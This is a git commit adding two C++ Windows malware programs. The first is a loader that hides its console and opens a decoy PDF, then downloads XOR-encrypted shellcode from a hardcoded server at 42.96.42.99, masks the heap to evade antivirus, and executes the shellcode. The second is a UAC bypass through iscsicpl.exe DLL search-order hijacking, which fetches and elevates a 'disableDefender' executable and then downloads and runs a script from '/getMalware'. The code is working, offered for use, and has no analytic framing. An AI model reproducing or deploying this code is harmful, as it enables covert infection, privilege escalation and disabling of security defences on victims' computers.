ccbedf363b9ebb429ae4237755a19ec86b21256e
trung501 <gotrungogle@gmail.com>
2023-03-31 19:27:27 +0700

    init

---
+++ BypassAV/ConsoleApplication1.cpp
@@ -0,0 +1,260 @@
+#include <windows.h> 
+#include <winhttp.h> 
+#include <stdio.h> 
+#include <Windows.h>
+#include <iostream>
+#include <vector>
+#include <fstream>
+#include <shellapi.h>
+#include <shlwapi.h>
+#include <winhttp.h> 
+
+#pragma comment(lib,"winhttp.lib") 
+#pragma comment(lib,"Shlwapi.lib") 
+#pragma warning(disable:4996)
+
+
+typedef struct Params {
+    LPVOID pBaseAddress;
+} PARAMS;
+
+typedef VOID(*fprun)(PARAMS pParams);
+
+void XOR(char* data, int len, unsigned char key) {
+    int i;
+    for (i = 0; i < len; i++)
+        data[i] ^= key;
+}
+
+// Encryption Key
+const char key[2] = "A";
+size_t keySize = sizeof(key);
+
+void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) {
+    for (size_t i = 0; i < length; ++i) {
+        buffer[i] ^= key[i % keyLength];
+    }
+}
+
+PROCESS_HEAP_ENTRY entry;
+void HeapEncryptDecrypt() {
+    SecureZeroMemory(&entry, sizeof(entry));
+    while (HeapWalk(GetProcessHeap(), &entry)) {
+        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
+            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);
+        }
+    }
+}
+
+int readPDF() {
+    // Step 1: Initialize WinHTTP session
+    HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (hSession == NULL) {
+        std::cerr << "WinHttpOpen failed: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Step 2: Connect to the server
+    HINTERNET hConnect = WinHttpConnect(hSession, L"42.96.42.99", 8082, 0);
+    if (hConnect == NULL) {
+        std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+
+    // Step 3: Create request to download PDF file
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getpdf", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (hRequest == NULL) {
+        std::cerr << "WinHttpOpenRequest failed: " << GetLastError() << std::endl;
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+
+    // Step 4: Send request to the server and receive response
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+        std::cerr << "WinHttpSendRequest failed: " << GetLastError() << std::endl;
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+    if (!WinHttpReceiveResponse(hRequest, NULL)) {
+        std::cerr << "WinHttpReceiveResponse failed: " << GetLastError() << std::endl;
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+
+    // Step 5: Read the PDF content from the response and save it to a file in temp folder
+    TCHAR szTempPath[MAX_PATH];
+    if (GetTempPath(MAX_PATH, szTempPath) == 0) {
+        std::cerr << "GetTempPath failed: " << GetLastError() << std::endl;
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+
+    TCHAR szTempFileName[MAX_PATH];
+    if (GetTempFileName(szTempPath, L"PDF", 0, szTempFileName) == 0) {
+        std::cerr << "GetTempFileName failed: " << GetLastError() << std::endl;
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 1;
+    }
+    PathRenameExtension(szTempFileName, L".pdf");
+    std::cerr << "file failed: " << szTempFileName << std::endl;
+    std::ofstream outFile(szTempFileName, std::ios::binary);
+    BYTE* pBuffer = new BYTE[4096];
+    DWORD dwBytesRead = 0;
+    while (WinHttpReadData(hRequest, pBuffer, 4096, &dwBytesRead)) {
+        if (dwBytesRead == 0) {
+            break;
+        }
+        outFile.write(reinterpret_cast<char*>(pBuffer), dwBytesRead);
+    }
+    delete[] pBuffer;
+    outFile.close();
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    std::cout << "PDF file saved to: " << szTempFileName << std::endl;
+    ShellExecute(NULL, L"open", szTempFileName, NULL, NULL, SW_SHOWNORMAL);
+
+    return 0;
+}
+
+//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
+int main()
+{
+
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
+    readPDF();
+
+    //--------- CONFIGURE -----------
+    LPCWSTR remotehost = L"42.96.42.99"; //change to your IP
+    int remoteport = 8082; //change to your port
+    LPCWSTR remotedir = L"/getPayload"; //change to your directory of the hosted bin file
+    unsigned char key = 0x7e; //change to your key
+    //-------------------------------
+
+    // Initialize variables 
+    HINTERNET hInternet;
+    HINTERNET hHttpSession;
+    HINTERNET hHttpConnection;
+    HINTERNET hHttpRequest;
+    DWORD dwSize;
+    BOOL bResults;
+    DWORD dwStatus;
+    DWORD dwStatusSize;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    std::vector<unsigned char> PEbuffer;
+
+    // Initialize WinHTTP (change the first argument to a valid User-Agent instead)
+    hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    printf("[+] WinHTTP initialized\n");
+
+    // Connect to the HTTP server 
+    hHttpSession = WinHttpConnect(hInternet, remotehost, remoteport, 0);
+    printf("[+] Connected to HTTP Server\n");
+
+    // Open an HTTP request 
+    hHttpRequest = WinHttpOpenRequest(hHttpSession, L"GET", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    printf("[+] Sending HTTP GET Request\n");
+
+    // Send a request 
+    bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    printf("[+] WinHTTP request sent\n");
+
+    // Wait for the response 
+    bResults = WinHttpReceiveResponse(hHttpRequest, NULL);
+    printf("[+] Response retrieved\n");
+
+    do
+    {
+        dwSize = 0;
+        if (!WinHttpQueryDataAvailable(hHttpRequest, &dwSize))
+        {
+            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+        }
+
+        // Allocate space for the buffer.
+        pszOutBuffer = new char[dwSize + 1];
+
+        // No more available data 
+        if (!pszOutBuffer) {
+            printf("[-] No more available data");
+            dwSize = 0;
+        }
+
+        // Read the Data.
+        ZeroMemory(pszOutBuffer, dwSize + 1);
+
+        if (!WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer,
+            dwSize, &dwDownloaded))
+            printf("Error %u in WinHttpReadData.\n", GetLastError());
+        else
+            PEbuffer.insert(PEbuffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+
+    } while (dwSize > 0);
+
+
+    char* PE = (char*)malloc(PEbuffer.size());
+    for (int i = 0; i < PEbuffer.size(); i++) {
+        PE[i] = PEbuffer[i] ^ 0x7e; //XOR encrypted
+    }
+    
+    //print payload
+	for (int i = 0; i < PEbuffer.size(); i++) {
+		printf("%02x", PE[i]);
+	}
+
+
+    printf("[+] Encrypted shellcode allocated in heap\n");
+
+    // Set the base address of the current image.
+    PARAMS pParams;
+    pParams.pBaseAddress = (LPVOID)GetModuleHandleA(NULL);
+    //printf("[+] Current image base address = 0x%p\n", pParams.pBaseAddress);
+    LPVOID pBuffer = VirtualAlloc(NULL, PEbuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (NULL == pBuffer) {
+        printf("[!] VirtualAlloc failed\n");
+        exit(1);
+    }
+
+    printf("[+] Allocated space for the buffer %p\n", pBuffer);
+    XOR(PE, PEbuffer.size(), key); //decrypt the PE shellcode before writing to memory
+    // Copy the shellcode into it.
+    memcpy(pBuffer, PE, PEbuffer.size());
+    printf("[+] Shellcode decrypted and written\n");
+
+    //time for your creativity
+    printf("[+] Encrypting the heap for 10 seconds\n");
+    HeapEncryptDecrypt();
+    Sleep(10);  //create your own sleep patch instead
+    printf("[+] Decrypting the heap\n");
+    HeapEncryptDecrypt();
+
+    // Make a function pointer to the run function shellcode.
+    fprun Run = (fprun)pBuffer;
+    Run(pParams);
+
+    // Close the HTTP request 
+    WinHttpCloseHandle(hHttpRequest);
+
+    // Close the session 
+    WinHttpCloseHandle(hHttpSession);
+
+    // Cleanup 
+    WinHttpCloseHandle(hInternet);
+
+    free(PE);
+
+    return 0;
+}
---
+++ iscsicpl_bypassUAC/iscsicpl_BypassUAC/iscsicpl_BypassUAC.cpp
@@ -0,0 +1,331 @@
+/* iscsicpl autoelevate DLL Search Order hijacking UAC Bypass
+* ===========================================================
+* The iscsicpl.exe binary is vulnerable to a DLL Search Order hijacking
+* vulnerability when running 32bit Microsoft binary on a 64bit host via
+* SysWOW64. The 32bit binary, will perform a search within user %Path%
+* for the DLL iscsiexe.dll. This can be exploited using a Proxy DLL to
+* execute code via "iscsicpl.exe" as autoelevate is enabled. This exploit
+* has been tested against the following versions of Windows desktop:
+*
+* Windows 11 Enterprise x64 (Version 10.0.22000.739).
+* Windows 8.1 Professional x64 (Version 6.3.9600).
+*
+* -- Hacker Fantastic
+* https://hacker.house
+*/
+#include <iostream>
+#include <vector>
+#include <Windows.h>
+#include <iostream>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <string.h>
+#include <tchar.h>
+#include <wchar.h>
+#include <winternl.h>
+#define SECURITY_WIN32 1
+#include <security.h>
+#include "resource.h"
+#include <fstream>
+#include <shellapi.h>
+#include <shlwapi.h>
+#include <winhttp.h> 
+using namespace std;
+
+/* linker lib comment includes for static */
+#pragma comment(lib,"User32.lib")
+#pragma comment(lib,"AdvApi32.lib")
+#pragma comment(lib,"Shell32.lib")
+#pragma comment(lib,"Ole32.lib")
+#pragma comment(lib,"Oleaut32.lib")
+#pragma comment(lib,"ntdll.lib")
+#pragma comment(lib,"Secur32.lib")
+#pragma comment(lib,"winhttp.lib") 
+#pragma comment(lib,"Shlwapi.lib") 
+#pragma warning(disable:4996)
+
+/* program defines for fixed size vars */
+#define MAX_ENV_SIZE 32767
+
+
+
+/* extract a "DLL" type resource from the PE */
+bool ExtractResource(int iId, LPWSTR pDest)
+{
+	HRSRC aResourceH;
+	HGLOBAL aResourceHGlobal;
+	unsigned char* aFilePtr;
+	unsigned long aFileSize;
+	HANDLE file_handle;
+	aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"DLL");
+	if (!aResourceH)
+	{
+		return false;
+	}
+	aResourceHGlobal = LoadResource(NULL, aResourceH);
+	if (!aResourceHGlobal)
+	{
+		return false;
+	}
+	aFileSize = SizeofResource(NULL, aResourceH);
+	aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
+	if (!aFilePtr)
+	{
+		return false;
+	}
+	file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
+	if (INVALID_HANDLE_VALUE == file_handle)
+	{
+		int err = GetLastError();
+		if ((ERROR_ALREADY_EXISTS == err) || (32 == err))
+		{
+			return true;
+		}
+		return false;
+	}
+	while (aFileSize--)
+	{
+		unsigned long numWritten;
+		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
+		aFilePtr++;
+	}
+	CloseHandle(file_handle);
+	return true;
+}
+
+char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
+
+	// Step 1: Initialize WinHTTP session
+	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	if (hSession == NULL) {
+		std::cerr << "WinHttpOpen failed: " << GetLastError() << std::endl;
+		return NULL;
+	}
+
+	// Step 2: Connect to the server
+	HINTERNET hConnect = WinHttpConnect(hSession, L"42.96.42.99", 8082, 0);
+	if (hConnect == NULL) {
+		std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
+		WinHttpCloseHandle(hSession);
+		return NULL;
+	}
+
+	// Step 3: Create request to download PDF file
+	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlpath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+	if (hRequest == NULL) {
+		std::cerr << "WinHttpOpenRequest failed: " << GetLastError() << std::endl;
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return NULL;
+	}
+
+	// Step 4: Send request to the server and receive response
+	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+		std::cerr << "WinHttpSendRequest failed: " << GetLastError() << std::endl;
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return NULL;
+	}
+	if (!WinHttpReceiveResponse(hRequest, NULL)) {
+		std::cerr << "WinHttpReceiveResponse failed: " << GetLastError() << std::endl;
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return NULL;
+	}
+
+	// Step 5: Read the PDF content from the response and save it to a file in temp folder
+	TCHAR szTempPath[MAX_PATH];
+	if (GetTempPath(MAX_PATH, szTempPath) == 0) {
+		std::cerr << "GetTempPath failed: " << GetLastError() << std::endl;
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return NULL;
+	}
+
+	TCHAR szTempFileName[MAX_PATH];
+	if (GetTempFileName(szTempPath, L"PDF", 0, szTempFileName) == 0) {
+		std::cerr << "GetTempFileName failed: " << GetLastError() << std::endl;
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return NULL;
+	}
+	PathRenameExtension(szTempFileName, extentionPath);
+	std::cerr << "file failed: " << szTempFileName << std::endl;
+	std::ofstream outFile(szTempFileName, std::ios::binary);
+	BYTE* pBuffer = new BYTE[4096];
+	DWORD dwBytesRead = 0;
+	while (WinHttpReadData(hRequest, pBuffer, 4096, &dwBytesRead)) {
+		if (dwBytesRead == 0) {
+			break;
+		}
+		outFile.write(reinterpret_cast<char*>(pBuffer), dwBytesRead);
+	}
+	delete[] pBuffer;
+	outFile.close();
+	WinHttpCloseHandle(hRequest);
+	WinHttpCloseHandle(hConnect);
+	WinHttpCloseHandle(hSession);
+
+	std::cout << "PDF file saved to: " << szTempFileName << std::endl;
+
+	if (run == true) {
+		ShellExecute(NULL, L"open", szTempFileName, NULL, NULL, SW_SHOWNORMAL);
+	}	
+
+	// Determine the size of the buffer required for the conversion
+	int size = WideCharToMultiByte(CP_ACP, 0, szTempFileName, -1, nullptr, 0, nullptr, nullptr);
+
+	// Allocate a buffer for the converted string
+	char* pathFile = new char[size];
+
+	// Convert the TCHAR string to a const char*
+	WideCharToMultiByte(CP_ACP, 0, szTempFileName, -1, pathFile, size, nullptr, nullptr);
+
+	return pathFile;
+}
+
+/* the main exploit routine */
+int main(int argc, char* argv[])
+{
+	char* pathDisableMalware =downloadAndRun(L"/disableDefender",L".exe",false);
+	//cout << pathDisableMalware;
+	if (pathDisableMalware == NULL) {
+		cout << "Do not have pathDisableMalware";
+		return 0;
+	}
+	//return 1;
+
+	LPWSTR pCMDpath;
+	size_t sSize = 0;
+	DWORD dwRet;
+	BOOL bResult;
+	HKEY hUserSID = NULL;
+	HKEY hRegKey = NULL;
+	HANDLE hToken = NULL;
+	DWORD dwErrorCode = 0;
+	DWORD dwBufferSize = 0;
+	PTOKEN_USER pTokenUser = NULL;
+	UNICODE_STRING uStr;
+	SHELLEXECUTEINFO shinfo;
+	// handle user argument for command
+	// multi-byte string to wide char string to convert user command into pCMD
+	pCMDpath = new TCHAR[MAX_PATH + 1];
+	mbstowcs_s(&sSize, pCMDpath, MAX_PATH, pathDisableMalware, strlen(pathDisableMalware));
+
+	// find the USER SID, to edit the user's registry hive directly to avoid permission problems.
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) == FALSE) {
+		dwErrorCode = GetLastError();
+		wprintf(L"OpenProcessToken failed. GetLastError returned: %d\n", dwErrorCode);
+		return HRESULT_FROM_WIN32(dwErrorCode);
+	}
+	// Retrieve the token information in a TOKEN_USER structure.
+	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize);
+	pTokenUser = (PTOKEN_USER) new BYTE[dwBufferSize];
+	memset(pTokenUser, 0, dwBufferSize);
+	if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)) {
+		CloseHandle(hToken);
+	}
+	else {
+		dwErrorCode = GetLastError();
+		wprintf(L"GetTokenInformation failed. GetLastError returned: %d\n", dwErrorCode);
+		return HRESULT_FROM_WIN32(dwErrorCode);
+	}
+	// is this a valid UserSID?
+	if (IsValidSid(pTokenUser->User.Sid) == FALSE) {
+		wprintf(L"The owner SID is invalid.\n");
+		delete[] pTokenUser;
+		return -1;
+	}
+	// using the UserSID, edit the %path% environment in the registry
+	RtlConvertSidToUnicodeString(&uStr, pTokenUser->User.Sid, true);
+	dwRet = RegOpenKeyEx(HKEY_USERS, uStr.Buffer, 0, MAXIMUM_ALLOWED, &hUserSID);
+	dwRet = RegOpenKeyExW(hUserSID, L"Environment", 0, MAXIMUM_ALLOWED, &hRegKey);
+	if (dwRet != ERROR_SUCCESS) {
+		printf("[-] RegOpenKeyEx Ret:%x\n", dwRet);
+		return dwRet;
+	}
+	// locate %TEMP% environment variable
+	LPWSTR pTmpPath = new WCHAR[MAX_ENV_SIZE];
+	GetEnvironmentVariable(L"TEMP", pTmpPath, MAX_ENV_SIZE);
+	// backup the value of %Path% before overwriting it.
+	LPWSTR cRegBackup = new WCHAR[MAX_ENV_SIZE];
+	DWORD cRegSize = MAX_ENV_SIZE;
+	dwRet = RegGetValue(hRegKey, NULL, L"Path", RRF_RT_ANY, NULL, cRegBackup, &cRegSize);
+	if (dwRet != ERROR_SUCCESS) {
+		printf("[-] RegGetValue Ret:%x\n", dwRet);
+		return dwRet;
+	};
+	// writes %TEMP% into %Path%
+	dwRet = RegSetValueExW(hRegKey, L"Path", NULL, REG_SZ, (BYTE*)pTmpPath, ((DWORD)wcslen(pTmpPath) * 2) + 1);
+	if (dwRet != ERROR_SUCCESS) {
+		printf("[-] RegSetValueExW Ret:%x\n", dwRet);
+		return dwRet;
+	};
+	// writes the DLL to %TEMP%
+	sSize = wcslen(pTmpPath) + wcslen(L"\\iscsiexe.dll") + 1;
+	LPWSTR pBinPatchPath = new WCHAR[sSize];
+	swprintf(pBinPatchPath, sSize, L"%s\\iscsiexe.dll", pTmpPath);
+	sSize = wcslen(pTmpPath) + wcslen(L"\\iscsiexe_org.dll") + 1;
+	LPWSTR pBinOrigPath = new WCHAR[sSize];
+	swprintf(pBinOrigPath, sSize, L"%s\\iscsiexe_org.dll", pTmpPath);
+	if (ExtractResource(IDR_DLLORIG, pBinOrigPath))
+	{
+		if (ExtractResource(IDR_DLLPROXY, pBinPatchPath))
+		{
+			// string table structure creation hack using wstring's for user command
+			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pCMDpath, L""};
+			vector< WORD > buffer;
+			for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++)
+			{
+				size_t pos = buffer.size();
+				buffer.resize(pos + data[index].size() + 1);
+				buffer[pos++] = static_cast<WORD>(data[index].size());
+				copy(data[index].begin(), data[index].end(),	buffer.begin() + pos);
+			}
+			// do not delete the existing resource entries
+			HANDLE hPE = BeginUpdateResource(pBinPatchPath, false);
+			// overwrite the IDS_CMD101 string table in the payload DLL with user command.
+			bResult = UpdateResource(hPE, RT_STRING, MAKEINTRESOURCE(7), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), reinterpret_cast<void*>(&buffer[0]),buffer.size() * sizeof(WORD));
+			bResult = EndUpdateResource(hPE,FALSE);
+			// TODO: should also really read %windir% here in case no standard path.
+			// executes syswow64 iscsicpl correctly with the new path
+			RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+			shinfo.cbSize = sizeof(shinfo);
+			shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+			shinfo.lpFile = L"c:\\Windows\\syswow64\\iscsicpl.exe";
+			shinfo.lpParameters = L""; // parameters
+			shinfo.lpDirectory = NULL;
+			shinfo.nShow = SW_SHOW;
+			shinfo.lpVerb = NULL;
+			bResult = ShellExecuteEx(&shinfo);
+			if (bResult) {
+				printf("[+] Success\n");
+			}
+		}
+	}
+	// execution has occured, restore the Path to return to normal. minimal essential clean-up process.
+	dwRet = RegSetValueExW(hRegKey, L"Path", NULL, REG_SZ, (BYTE*)cRegBackup, ((DWORD)wcslen(cRegBackup) * 2) + 1);
+	if (dwRet != ERROR_SUCCESS) {
+		printf("[-] RegSetValue Ret:%x\n", dwRet);
+		return dwRet;
+	};
+	/* // we can wait here on process to clean up the DLL's, must wait for iscsicpl.exe to terminate before we can delete dll's, hangs the shell.
+	if (bResult) {
+		WaitForSingleObject(shinfo.hProcess, 0x8000);
+		CloseHandle(shinfo.hProcess);
+	}
+	*/
+	
+	char* pathMalware = downloadAndRun(L"/getMalware", L".js", true);
+	//cout << pathMalware;
+	if (pathMalware == NULL) {
+		cout << "Do not have pathMalware";
+		return 0;
+	}	
+	return EXIT_SUCCESS;
+}
